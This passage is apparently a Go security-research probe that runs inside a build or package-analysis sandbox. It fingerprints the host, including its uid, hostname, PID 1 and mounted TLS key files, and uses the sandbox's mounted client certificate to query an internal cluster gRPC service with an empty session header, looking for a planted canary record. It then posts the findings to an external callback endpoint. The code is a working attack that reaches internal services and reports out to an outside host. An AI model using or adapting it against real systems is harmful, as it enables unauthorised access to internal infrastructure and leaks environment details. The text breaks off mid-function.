package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

var genericResultURL string
var compilerResultURL string
var callbackSessionNonce string
var probeUserAgent string
var pinnedReadbackURL string
var pinnedReadbackOrigin string
var pinnedReadbackSession string
var pinnedReadbackURLSHA256 string
var rpcDialAddress string

const (
	protocolVersion            = 1
	moduleName                 = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion               = "v0.0.58-codex"
	expectedUserAgent          = "go-cgo-pkgsite-probe-v058-codex"
	targetRegistry             = "https://proxy.golang.org"
	targetModuleName           = "github.com/benr00t3d/go-byteman-crosswrite-canary"
	targetVersion              = "v0.0.1"
	targetCanaryBytes          = 2512
	targetSHA512               = "a3b9e460a4e6c294b91d4677329ede02dd062ff70f431efb1b6853d98f3a146cb5cebafca064ec28e10e84a32b8e5c3892e8fce542528e40b654e5170e32cb68"
	targetSHA256               = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
	targetSHA1                 = "b1cd071d32f0c5cd30699b5d27086059c3fba547"
	targetMD5                  = "570588f59942a9c79262238525fbe16f"
	descriptorReceiptSHA256    = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
	expectedPinnedURLSHA256    = "78d7361f8ebd389fc5da7ba45c0e69cde74fbc290522804942bc3cb42fe30334"
	expectedRecordSHA256       = "adfb1c1ce1b1b12a6c7fb47bc71a599080dec7357763e3af5d937849c7961e47"
	expectedDigestFieldSHA256  = "6bc319fc0d36191274cec1b7269adfd81385b88169cdf83a783dc882097a6b94"
	expectedPathFieldSHA256    = "59af025ea13df7229bbdf0be891d14d7e5e329584c1f0ff5c52b6861abcf978f"
	expectedIDFieldSHA256      = "98a540dcf85bd84794699b0522f3e5d8f5de0697b1b0c51eef1c39058ba58ce3"
	expectedMetadataSHA256     = "d8a03518274139d9b6dbec8b09ce0e6d9ec1ddfc3c9d5a15119ca7c677d85a62"
	emptyValueSHA256           = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	priorFetchReceiptSHA256    = "bbfefc563e5321dc51676ed52d5e7f8d7daae3dc45c423da9fa7dd06bd5fee9d"
	lookupRecordLimit          = 32
	callbackTimeout            = 30 * time.Second
	lookupGRPCTimeout          = 120 * time.Second
	lookupHTTPTimeout          = 125 * time.Second
	maximumResultBytes         = 256 * 1024
	maximumResponseFrame       = 512 * 1024
	maximumResponseFrames      = 64
	maximumResponseBytes       = 4 * 1024 * 1024
	maximumDownloadRecordBytes = 256 * 1024
	bytemanServiceHost         = "byteman.default.svc.cluster.local"
	bytemanServicePort         = 9000
	bytemanTLSServerName       = "localhost"
	clientCertificatePath      = "/etc/tls/client/tls.crt"
	clientKeyPath              = "/etc/tls/client/tls.key"
	serverPoolPath             = "/etc/tls/server-pool/server-tls-pool.pem"
)

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type fileEntry struct {
	Name string `json:"name"`
	Mode string `json:"mode"`
	Size int64  `json:"size"`
}
type tlsFile struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
}
type identityResult struct {
	Lane        string      `json:"lane"`
	CWD         string      `json:"cwd"`
	UID         int         `json:"uid"`
	GID         int         `json:"gid"`
	Hostname    string      `json:"hostname"`
	PID1        string      `json:"pid1"`
	ModuleFiles []fileEntry `json:"module_files"`
	TLSFiles    []tlsFile   `json:"tls_files"`
}

type grpcMetadataValue struct {
	Present   bool   `json:"present"`
	Values    int    `json:"values,omitempty"`
	RawBytes  int    `json:"raw_bytes,omitempty"`
	RawSHA256 string `json:"raw_sha256,omitempty"`
	Text      string `json:"text,omitempty"`
}
type wireFieldDigest struct {
	Number   int     `json:"number"`
	WireType int     `json:"wire_type"`
	Varint   *uint64 `json:"varint,omitempty"`
	Bytes    int     `json:"bytes,omitempty"`
	SHA256   string  `json:"sha256,omitempty"`
	Text     string  `json:"text,omitempty"`
}
type lookupFrameResult struct {
	Index         int      `json:"index"`
	PayloadBytes  int      `json:"payload_bytes"`
	PayloadSHA256 string   `json:"payload_sha256"`
	FrameSHA256   string   `json:"frame_sha256"`
	Records       int      `json:"records"`
	RecordSHA256s []string `json:"record_sha256s,omitempty"`
	MatchedRecord int      `json:"matched_record,omitempty"`
}
type digestProof struct {
	RawBytes  int    `json:"raw_bytes"`
	RawSHA256 string `json:"raw_sha256"`
	SHA512    string `json:"sha512"`
	SHA256    string `json:"sha256"`
	SHA1      string `json:"sha1"`
	MD5       string `json:"md5"`
	AllExact  bool   `json:"all_exact"`
}
type downloadRecordProof struct {
	Matched        bool        `json:"matched"`
	RecordBytes    int         `json:"record_bytes"`
	RecordSHA256   string      `json:"record_sha256"`
	URLSHA256      string      `json:"url_sha256"`
	Size           uint64      `json:"size"`
	StatusCode     uint64      `json:"status_code"`
	ContentType    string      `json:"content_type"`
	CacheControl   string      `json:"cache_control"`
	MetadataSHA256 string      `json:"metadata_sha256"`
	Digest         digestProof `json:"digest"`
	PathPresent    bool        `json:"path_present"`
	PathBytes      int         `json:"path_bytes"`
	PathSHA256     string      `json:"path_sha256"`
	IDPresent      bool        `json:"id_present"`
	IDBytes        int         `json:"id_bytes"`
	IDSHA256       string      `json:"id_sha256"`
	HeaderCount    int         `json:"header_count"`
}
type lookupResult struct {
	Method                  string              `json:"method"`
	HTTPStatus              int                 `json:"http_status,omitempty"`
	ContentType             string              `json:"content_type,omitempty"`
	GRPCStatusHeader        grpcMetadataValue   `json:"grpc_status_header"`
	GRPCMessageHeader       grpcMetadataValue   `json:"grpc_message_header"`
	GRPCStatusTrailer       grpcMetadataValue   `json:"grpc_status_trailer"`
	GRPCMessageTrailer      grpcMetadataValue   `json:"grpc_message_trailer"`
	TrailersObserved        bool                `json:"trailers_observed"`
	TrailersComplete        bool                `json:"trailers_complete"`
	EOFObserved             bool                `json:"eof_observed"`
	RequestPayloadBytes     int                 `json:"request_payload_bytes"`
	RequestPayloadSHA256    string              `json:"request_payload_sha256"`
	RequestFrameBytes       int                 `json:"request_frame_bytes"`
	RequestFrameSHA256      string              `json:"request_frame_sha256"`
	RequestWire             []wireFieldDigest   `json:"request_wire"`
	SOSSessionHeaderPresent bool                `json:"sos_session_header_present"`
	SOSSessionHeaderBytes   int                 `json:"sos_session_header_bytes"`
	SOSSessionHeaderSHA256  string              `json:"sos_session_header_sha256"`
	Frames                  []lookupFrameResult `json:"frames,omitempty"`
	FrameCount              int                 `json:"frame_count"`
	RecordCount             int                 `json:"record_count"`
	MatchCount              int                 `json:"match_count"`
	MatchFrame              int                 `json:"match_frame,omitempty"`
	MatchRecord             int                 `json:"match_record,omitempty"`
	Match                   downloadRecordProof `json:"match"`
	StoppedBeforeEOF        bool                `json:"stopped_before_eof"`
	Verified                bool                `json:"verified"`
	StartedUTC              string              `json:"started_utc"`
	FinishedUTC             string              `json:"finished_utc"`
	DurationMS              int64               `json:"duration_ms"`
	Error                   string              `json:"error,omitempty"`
}
type probeReport struct {
	Schema                  string         `json:"schema"`
	Module                  string         `json:"module"`
	Version                 string         `json:"version"`
	TargetModule            string         `json:"target_module"`
	TargetVersion           string         `json:"target_version"`
	TargetURLSHA256         string         `json:"target_url_sha256"`
	TargetBodySHA256        string         `json:"target_body_sha256"`
	DescriptorReceiptSHA256 string         `json:"descriptor_receipt_sha256"`
	PriorFetchReceiptSHA256 string         `json:"prior_fetch_receipt_sha256"`
	ExpectedRecordSHA256    string         `json:"expected_record_sha256"`
	ExpectedDigestSHA256    string         `json:"expected_digest_field_sha256"`
	ExpectedPathSHA256      string         `json:"expected_path_field_sha256"`
	ExpectedIDSHA256        string         `json:"expected_id_field_sha256"`
	StartedUTC              string         `json:"started_utc"`
	FinishedUTC             string         `json:"finished_utc"`
	Identity                identityResult `json:"identity"`
	Lookup                  lookupResult   `json:"lookup"`
	Reason                  string         `json:"reason"`
}
type wireField struct {
	number int
	wire   int
	varint uint64
	value  []byte
}
type recordExpectation struct {
	URL               string
	URLSHA256         string
	RecordSHA256      string
	DigestFieldSHA256 string
	PathFieldSHA256   string
	IDFieldSHA256     string
}
type lookupAccumulator struct {
	FrameCount  int
	RecordCount int
	MatchCount  int
	MatchFrame  int
	MatchRecord int
	Proof       downloadRecordProof
}

func main() {
	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	report := newProbeReport(started, identity)
	endpoint := genericResultURL
	resultID := "v058-codex-" + identity.Lane
	if identity.Lane == "capslock" {
		endpoint = compilerResultURL
		resultID = "v058-codex-capslock-lookup"
		report.Lookup = runCoordinateLookup()
		if report.Lookup.Verified {
			report.Reason = "incremental coordinate Lookup returned the exact prior v44 owned-B Download record"
		} else {
			report.Reason = "incremental coordinate Lookup did not verify the exact prior v44 owned-B Download record"
		}
	} else {
		report.Reason = "Lookup is fixed to the verified Capslock lane"
	}
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
}

func newProbeReport(started time.Time, identity identityResult) probeReport {
	return probeReport{Schema: "owned-byteman-coordinate-lookup/v1", Module: moduleName, Version: probeVersion, TargetModule: targetModuleName, TargetVersion: targetVersion, TargetURLSHA256: pinnedReadbackURLSHA256, TargetBodySHA256: targetSHA256, DescriptorReceiptSHA256: descriptorReceiptSHA256, PriorFetchReceiptSHA256: priorFetchReceiptSHA256, ExpectedRecordSHA256: expectedRecordSHA256, ExpectedDigestSHA256: expectedDigestFieldSHA256, ExpectedPathSHA256: expectedPathFieldSHA256, ExpectedIDSHA256: expectedIDFieldSHA256, StartedUTC: started.UTC().Format(time.RFC3339Nano), Identity: identity, Lookup: lookupResult{Method: "/sos.byteman.Byteman/Lookup", MatchFrame: -1, MatchRecord: -1}}
}

func validNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, c := range value {
		if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
			return false
		}
	}
	return true
}
func parseExactHTTPS(raw, expectedPath string) (*url.URL, error) {
	p, err := url.Parse(raw)
	if err != nil || p.Scheme != "https" || p.Host == "" || p.Hostname() == "" || p.User != nil || p.Opaque != "" || p.RawPath != "" || p.RawQuery != "" || p.ForceQuery || p.Fragment != "" || p.Path != expectedPath {
		return nil, errors.New("URL was outside its exact fixed HTTPS shape")
	}
	if port := p.Port(); port != "" {
		value, e := strconv.Atoi(port)
		if e != nil || value < 1 || value > 65535 {
			return nil, errors.New("URL port was invalid")
		}
	}
	return p, nil
}
func validateRuntimeConfiguration() error {
	return validateRuntimeConfigurationWithExpectedSHA(expectedPinnedURLSHA256)
}

func validateRuntimeConfigurationWithExpectedSHA(expectedURLSHA256 string) error {
	if !validNonce(callbackSessionNonce) || !validNonce(pinnedReadbackSession) || callbackSessionNonce == pinnedReadbackSession || probeUserAgent != expectedUserAgent {
		return errors.New("runtime identities were invalid or not isolated")
	}
	g, err := parseExactHTTPS(genericResultURL, "/v1/result/"+callbackSessionNonce+"/generic")
	if err != nil {
		return err
	}
	c, err := parseExactHTTPS(compilerResultURL, "/v1/result/"+callbackSessionNonce+"/compiler")
	if err != nil || g.Scheme != c.Scheme || g.Host != c.Host {
		return errors.New("callback endpoints did not share one exact origin")
	}
	path := "/v1/goproxy/" + pinnedReadbackSession + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"
	r, err := parseExactHTTPS(pinnedReadbackURL, path)
	if err != nil || pinnedReadbackOrigin != r.Scheme+"://"+r.Host || pinnedReadbackOrigin == g.Scheme+"://"+g.Host {
		return errors.New("pinned v44 URL was not isolated from callback origin")
	}
	d := sha256.Sum256([]byte(pinnedReadbackURL))
	if pinnedReadbackURLSHA256 != expectedURLSHA256 || hex.EncodeToString(d[:]) != pinnedReadbackURLSHA256 {
		return errors.New("pinned v44 URL digest mismatch")
	}
	return nil
}
func productionExpectation() recordExpectation {
	return recordExpectation{URL: pinnedReadbackURL, URLSHA256: expectedPinnedURLSHA256, RecordSHA256: expectedRecordSHA256, DigestFieldSHA256: expectedDigestFieldSHA256, PathFieldSHA256: expectedPathFieldSHA256, IDFieldSHA256: expectedIDFieldSHA256}
}

func runCoordinateLookup() (result lookupResult) {
	started := time.Now()
	payload := buildCoordinateLookupRequest()
	frame := grpcFrame(payload)
	pd := sha256.Sum256(payload)
	fd := sha256.Sum256(frame)
	result = lookupResult{Method: "/sos.byteman.Byteman/Lookup", RequestPayloadBytes: len(payload), RequestPayloadSHA256: hex.EncodeToString(pd[:]), RequestFrameBytes: len(frame), RequestFrameSHA256: hex.EncodeToString(fd[:]), RequestWire: summarizeLookupRequest(payload), SOSSessionHeaderPresent: true, SOSSessionHeaderBytes: 0, SOSSessionHeaderSHA256: emptyValueSHA256, MatchFrame: -1, MatchRecord: -1, StartedUTC: started.UTC().Format(time.RFC3339Nano)}
	defer func() {
		result.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		result.DurationMS = time.Since(started).Milliseconds()
	}()
	client, endpoint, err := newBytemanClient()
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	defer client.CloseIdleConnections()
	ctx, cancel := context.WithTimeout(context.Background(), lookupHTTPTimeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+result.Method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	applyLookupHeaders(req)
	response, err := client.Do(req)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	captureGRPCMetadata(response.Header, &result.GRPCStatusHeader, &result.GRPCMessageHeader)
	if response.StatusCode != http.StatusOK || !allowedGRPCContentType(result.ContentType) {
		result.Error = "Lookup response did not have HTTP 200 application/grpc"
		return
	}
	acc := lookupAccumulator{MatchFrame: -1, MatchRecord: -1}
	total := 0
	for index := 0; index < maximumResponseFrames; index++ {
		header := make([]byte, 5)
		if _, err := io.ReadFull(response.Body, header); err != nil {
			result.EOFObserved = errors.Is(err, io.EOF)
			result.TrailersComplete = result.EOFObserved || errors.Is(err, io.ErrUnexpectedEOF)
			captureGRPCTrailers(response, &result)
			result.FrameCount, result.RecordCount, result.MatchCount = acc.FrameCount, acc.RecordCount, acc.MatchCount
			result.Error = cleanError(fmt.Errorf("incremental Lookup gRPC frame header: %w", err))
			return
		}
		if header[0] != 0 {
			result.Error = "compressed Lookup frame was rejected"
			return
		}
		length := int(binary.BigEndian.Uint32(header[1:]))
		if length < 0 || length > maximumResponseFrame || total+length > maximumResponseBytes {
			result.Error = "Lookup response exceeded a fixed byte bound"
			return
		}
		body := make([]byte, length)
		if _, err := io.ReadFull(response.Body, body); err != nil {
			result.TrailersComplete = errors.Is(err, io.EOF) || errors.Is(err, io.ErrUnexpectedEOF)
			captureGRPCTrailers(response, &result)
			result.Error = cleanError(fmt.Errorf("incremental Lookup gRPC frame payload: %w", err))
			return
		}
		total += length
		bd := sha256.Sum256(body)
		whole := append(append([]byte(nil), header...), body...)
		wd := sha256.Sum256(whole)
		fr := lookupFrameResult{Index: index, PayloadBytes: length, PayloadSHA256: hex.EncodeToString(bd[:]), FrameSHA256: hex.EncodeToString(wd[:]), MatchedRecord: -1}
		matched, err := consumeLookupFrame(body, index, &acc, &fr, productionExpectation())
		result.Frames = append(result.Frames, fr)
		result.FrameCount, result.RecordCount, result.MatchCount = acc.FrameCount, acc.RecordCount, acc.MatchCount
		if err != nil {
			result.Error = cleanError(err)
			return
		}
		if matched {
			result.MatchFrame, result.MatchRecord, result.Match = acc.MatchFrame, acc.MatchRecord, acc.Proof
			result.StoppedBeforeEOF = true
			result.Verified = acc.MatchCount == 1 && acc.Proof.Matched
			_ = response.Body.Close()
			captureGRPCTrailers(response, &result)
			return
		}
	}
	result.Error = "Lookup exceeded the fixed frame bound before an exact match"
	return
}

func consumeLookupFrame(payload []byte, frameIndex int, acc *lookupAccumulator, fr *lookupFrameResult, expect recordExpectation) (bool, error) {
	fields, err := decodeWireFields(payload)
	if err != nil {
		return false, err
	}
	acc.FrameCount++
	matchedInFrame := false
	for _, f := range fields {
		if f.number != 1 || f.wire != 2 {
			return false, errors.New("LookupResponse contained a field outside repeated Download field 1")
		}
		if acc.RecordCount >= lookupRecordLimit {
			return false, errors.New("LookupResponse exceeded the requested record limit")
		}
		recordIndex := acc.RecordCount
		acc.RecordCount++
		fr.Records++
		d := sha256.Sum256(f.value)
		fr.RecordSHA256s = append(fr.RecordSHA256s, hex.EncodeToString(d[:]))
		proof, matched, err := analyzeDownloadRecord(f.value, expect)
		if err != nil {
			return false, err
		}
		if matched {
			acc.MatchCount++
			if acc.MatchCount != 1 {
				return false, errors.New("LookupResponse contained multiple exact v44 matches")
			}
			acc.MatchFrame, acc.MatchRecord, acc.Proof = frameIndex, recordIndex, proof
			fr.MatchedRecord = recordIndex
			matchedInFrame = true
		}
	}
	return matchedInFrame, nil
}

func analyzeDownloadRecord(raw []byte, expect recordExpectation) (downloadRecordProof, bool, error) {
	proof := downloadRecordProof{RecordBytes: len(raw)}
	if len(raw) == 0 || len(raw) > maximumDownloadRecordBytes {
		return proof, false, errors.New("Download record exceeded exact size bounds")
	}
	rd := sha256.Sum256(raw)
	proof.RecordSHA256 = hex.EncodeToString(rd[:])
	if proof.RecordSHA256 != expect.RecordSHA256 {
		return proof, false, nil
	}
	fields, err := decodeWireFields(raw)
	if err != nil {
		return proof, false, err
	}
	counts := map[int]int{}
	var urlValue, digestValue, contentType, cacheControl, metadataValue, pathValue, idValue []byte
	var sizeValue, statusValue uint64
	for _, f := range fields {
		counts[f.number]++
		if f.number != 18 && counts[f.number] > 1 {
			return proof, false, errors.New("Download record duplicated an optional field")
		}
		switch f.number {
		case 1, 4, 6, 7, 15, 16, 17:
			if f.wire != 2 || len(f.value) > 64*1024 || !utf8.Valid(f.value) {
				return proof, false, errors.New("Download record string field was invalid")
			}
			switch f.number {
			case 1:
				urlValue = f.value
			case 4:
				contentType = f.value
			case 7:
				cacheControl = f.value
			case 16:
				pathValue = f.value
			case 17:
				idValue = f.value
			}
		case 2:
			if f.wire != 2 {
				return proof, false, errors.New("Download digest field used wrong wire type")
			}
			if err := validateDigestSchema(f.value); err != nil {
				return proof, false, err
			}
			digestValue = f.value
		case 12:
			if f.wire != 2 {
				return proof, false, errors.New("Download metadata field used wrong wire type")
			}
			if err := validateMetadataSchema(f.value); err != nil {
				return proof, false, err
			}
			metadataValue = f.value
		case 18:
			if f.wire != 2 || counts[18] > 64 {
				return proof, false, errors.New("Download header field was invalid")
			}
			if err := validateDownloadHeader(f.value); err != nil {
				return proof, false, err
			}
		case 3, 5, 8, 9, 10, 11, 13, 19:
			if f.wire != 0 {
				return proof, false, errors.New("Download scalar field used wrong wire type")
			}
			if f.number == 3 {
				sizeValue = f.varint
			}
			if f.number == 5 {
				statusValue = f.varint
			}
		default:
			return proof, false, errors.New("Download record contained field outside pinned schema")
		}
	}
	for _, n := range []int{1, 2, 3, 4, 5, 7, 12, 16, 17} {
		if counts[n] != 1 {
			return proof, false, errors.New("exact v44 Download record omitted required field")
		}
	}
	for _, n := range []int{6, 8, 9, 10, 11, 13, 15, 19} {
		if counts[n] != 0 {
			return proof, false, errors.New("exact v44 Download record had unexpected optional field")
		}
	}
	if counts[18] != 8 {
		return proof, false, errors.New("exact v44 Download record had wrong header count")
	}
	ud := sha256.Sum256(urlValue)
	proof.URLSHA256 = hex.EncodeToString(ud[:])
	if string(urlValue) != expect.URL || proof.URLSHA256 != expect.URLSHA256 {
		return proof, false, errors.New("exact v44 Download URL mismatch")
	}
	dp, err := analyzeExactDigest(digestValue)
	if err != nil {
		return proof, false, err
	}
	proof.Digest = dp
	md := sha256.Sum256(metadataValue)
	proof.MetadataSHA256 = hex.EncodeToString(md[:])
	if proof.MetadataSHA256 != expectedMetadataSHA256 || !exactTargetMetadata(metadataValue) {
		return proof, false, errors.New("exact v44 Download metadata mismatch")
	}
	pd := sha256.Sum256(pathValue)
	id := sha256.Sum256(idValue)
	proof.PathPresent, proof.PathBytes, proof.PathSHA256 = len(pathValue) > 0, len(pathValue), hex.EncodeToString(pd[:])
	proof.IDPresent, proof.IDBytes, proof.IDSHA256 = len(idValue) > 0, len(idValue), hex.EncodeToString(id[:])
	proof.Size, proof.StatusCode = sizeValue, statusValue
	proof.ContentType, proof.CacheControl, proof.HeaderCount = string(contentType), string(cacheControl), counts[18]
	if sizeValue != targetCanaryBytes || statusValue != http.StatusOK || string(contentType) != "application/zip" || string(cacheControl) != "no-store" || !proof.PathPresent || !proof.IDPresent || proof.PathSHA256 != expect.PathFieldSHA256 || proof.IDSHA256 != expect.IDFieldSHA256 || dp.RawSHA256 != expect.DigestFieldSHA256 || !dp.AllExact {
		return proof, false, errors.New("exact v44 Download integrity fields did not match")
	}
	proof.Matched = true
	return proof, true, nil
}

func validateDigestSchema(raw []byte) error {
	fields, err := decodeWireFields(raw)
	if err != nil {
		return err
	}
	counts := map[int]int{}
	for _, f := range fields {
		counts[f.number]++
		if f.number < 1 || f.number > 4 || f.wire != 2 || counts[f.number] > 1 || len(f.value) > 64 {
			return errors.New("Digest contained field outside pinned schema")
		}
	}
	return nil
}
func analyzeExactDigest(raw []byte) (digestProof, error) {
	proof := digestProof{RawBytes: len(raw)}
	d := sha256.Sum256(raw)
	proof.RawSHA256 = hex.EncodeToString(d[:])
	fields, err := decodeWireFields(raw)
	if err != nil {
		return proof, err
	}
	counts := map[int]int{}
	for _, f := range fields {
		counts[f.number]++
		if f.wire != 2 || f.number < 1 || f.number > 4 || counts[f.number] > 1 {
			return proof, errors.New("exact Digest schema mismatch")
		}
		v := hex.EncodeToString(f.value)
		switch f.number {
		case 1:
			proof.SHA512 = v
		case 2:
			proof.SHA256 = v
		case 3:
			proof.SHA1 = v
		case 4:
			proof.MD5 = v
		}
	}
	proof.AllExact = counts[1] == 1 && counts[2] == 1 && counts[3] == 1 && counts[4] == 1 && proof.SHA512 == targetSHA512 && proof.SHA256 == targetSHA256 && proof.SHA1 == targetSHA1 && proof.MD5 == targetMD5 && proof.RawSHA256 == expectedDigestFieldSHA256
	if !proof.AllExact {
		return proof, errors.New("exact Digest values did not match all four canary digests")
	}
	return proof, nil
}
func validateMetadataSchema(raw []byte) error {
	fields, err := decodeWireFields(raw)
	if err != nil {
		return err
	}
	counts := map[int]int{}
	for _, f := range fields {
		counts[f.number]++
		if f.number < 1 || f.number > 6 || counts[f.number] > 1 {
			return errors.New("Metadata contained field outside pinned schema")
		}
		if (f.number == 1 || f.number == 3 || f.number == 5) && f.wire != 0 {
			return errors.New("Metadata enum used wrong wire type")
		}
		if (f.number == 2 || f.number == 4 || f.number == 6) && (f.wire != 2 || !utf8.Valid(f.value)) {
			return errors.New("Metadata string used wrong wire type")
		}
	}
	return nil
}
func exactTargetMetadata(raw []byte) bool {
	fields, err := decodeWireFields(raw)
	if err != nil {
		return false
	}
	counts := map[int]int{}
	matched := map[int]bool{}
	for _, f := range fields {
		counts[f.number]++
		switch f.number {
		case 2:
			matched[2] = f.wire == 2 && string(f.value) == targetRegistry
		case 3:
			matched[3] = f.wire == 0 && f.varint == 1
		case 4:
			matched[4] = f.wire == 2 && string(f.value) == targetModuleName
		case 5:
			matched[5] = f.wire == 0 && f.varint == 1
		case 6:
			matched[6] = f.wire == 2 && string(f.value) == targetVersion
		}
	}
	if counts[1] != 0 {
		return false
	}
	for _, n := range []int{2, 3, 4, 5, 6} {
		if counts[n] != 1 || !matched[n] {
			return false
		}
	}
	return true
}
func validateDownloadHeader(raw []byte) error {
	fields, err := decodeWireFields(raw)
	if err != nil {
		return err
	}
	counts := map[int]int{}
	for _, f := range fields {
		counts[f.number]++
		if (f.number != 1 && f.number != 2) || f.wire != 2 || counts[f.number] > 1 || len(f.value) > 64*1024 {
			return errors.New("Download.Header contained field outside pinned schema")
		}
		if f.number == 1 && (len(f.value) == 0 || !utf8.Valid(f.value)) {
			return errors.New("Download.Header key was invalid")
		}
	}
	if counts[1] != 1 || counts[2] != 1 {
		return errors.New("Download.Header omitted key or value")
	}
	return nil
}

func buildCoordinateLookupRequest() []byte {
	r := appendStringField(nil, 7, targetRegistry)
	r = appendStringField(r, 8, targetModuleName)
	r = appendStringField(r, 9, targetVersion)
	return appendVarintField(r, 10, lookupRecordLimit)
}
func summarizeLookupRequest(payload []byte) []wireFieldDigest {
	fields, err := decodeWireFields(payload)
	if err != nil {
		return nil
	}
	result := make([]wireFieldDigest, 0, len(fields))
	for _, f := range fields {
		item := wireFieldDigest{Number: f.number, WireType: f.wire}
		if f.wire == 0 {
			v := f.varint
			item.Varint = &v
		} else {
			d := sha256.Sum256(f.value)
			item.Bytes = len(f.value)
			item.SHA256 = hex.EncodeToString(d[:])
			if f.number == 7 || f.number == 8 || f.number == 9 {
				item.Text = string(f.value)
			}
		}
		result = append(result, item)
	}
	return result
}
func decodeWireFields(data []byte) ([]wireField, error) {
	fields := []wireField{}
	for offset := 0; offset < len(data); {
		key, size := binary.Uvarint(data[offset:])
		if size <= 0 {
			return nil, errors.New("protobuf field key was invalid")
		}
		offset += size
		f := wireField{number: int(key >> 3), wire: int(key & 7)}
		if f.number < 1 || f.number > (1<<29)-1 {
			return nil, errors.New("protobuf field number was invalid")
		}
		switch f.wire {
		case 0:
			f.varint, size = binary.Uvarint(data[offset:])
			if size <= 0 {
				return nil, errors.New("protobuf varint was invalid")
			}
			offset += size
		case 2:
			length, n := binary.Uvarint(data[offset:])
			if n <= 0 {
				return nil, errors.New("protobuf length was invalid")
			}
			offset += n
			if length > uint64(len(data)-offset) {
				return nil, errors.New("protobuf field was truncated")
			}
			f.value = data[offset : offset+int(length)]
			offset += int(length)
		default:
			return nil, errors.New("protobuf wire type was outside pinned schema")
		}
		fields = append(fields, f)
		if len(fields) > 1024 {
			return nil, errors.New("protobuf message exceeded fixed field bound")
		}
	}
	return fields, nil
}
func grpcFrame(payload []byte) []byte {
	f := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(f[1:], uint32(len(payload)))
	return append(f, payload...)
}
func appendUvarint(dst []byte, v uint64) []byte {
	var b [binary.MaxVarintLen64]byte
	n := binary.PutUvarint(b[:], v)
	return append(dst, b[:n]...)
}
func appendVarintField(dst []byte, n int, v uint64) []byte {
	dst = appendUvarint(dst, uint64(n<<3))
	return appendUvarint(dst, v)
}
func appendBytesField(dst []byte, n int, v []byte) []byte {
	dst = appendUvarint(dst, uint64(n<<3|2))
	dst = appendUvarint(dst, uint64(len(v)))
	return append(dst, v...)
}
func appendStringField(dst []byte, n int, v string) []byte {
	return appendBytesField(dst, n, []byte(v))
}

func allowedGRPCContentType(value string) bool {
	return value == "application/grpc"
}

func applyLookupHeaders(request *http.Request) {
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Grpc-Timeout", strconv.Itoa(int(lookupGRPCTimeout/time.Second))+"S")
	request.Header[http.CanonicalHeaderKey("X-SOS-SessionID")] = []string{""}
}

func captureGRPCMetadata(h http.Header, status, message *grpcMetadataValue) {
	*status = captureGRPCMetadataValue(h, "Grpc-Status", false)
	*message = captureGRPCMetadataValue(h, "Grpc-Message", true)
}
func captureGRPCTrailers(response *http.Response, result *lookupResult) {
	if len(response.Trailer) == 0 {
		return
	}
	result.TrailersObserved = true
	captureGRPCMetadata(response.Trailer, &result.GRPCStatusTrailer, &result.GRPCMessageTrailer)
}
func captureGRPCMetadataValue(h http.Header, name string, decode bool) grpcMetadataValue {
	values := []string(nil)
	for key, candidates := range h {
		if strings.EqualFold(key, name) {
			values = append(values, candidates...)
		}
	}
	if values == nil {
		return grpcMetadataValue{}
	}
	raw := strings.Join(values, "\x00")
	d := sha256.Sum256([]byte(raw))
	text := raw
	if decode {
		if decoded, err := url.PathUnescape(raw); err == nil {
			text = decoded
		}
		text = cleanSensitiveText(text)
	} else if len(text) > 64 {
		text = text[:64] + "[truncated]"
	}
	return grpcMetadataValue{Present: true, Values: len(values), RawBytes: len(raw), RawSHA256: hex.EncodeToString(d[:]), Text: text}
}

func mountedPrivateRootPool(pem []byte) (*x509.CertPool, error) {
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(pem) {
		return nil, errors.New("mounted Byteman root pool contained no certificates")
	}
	return roots, nil
}
func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("Byteman TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	if leaf.Subject.CommonName != bytemanTLSServerName {
		return errors.New("Byteman TLS legacy common name was not localhost")
	}
	intermediates := x509.NewCertPool()
	for _, cert := range state.PeerCertificates[1:] {
		intermediates.AddCert(cert)
	}
	_, err := leaf.Verify(x509.VerifyOptions{Roots: roots, Intermediates: intermediates, KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}})
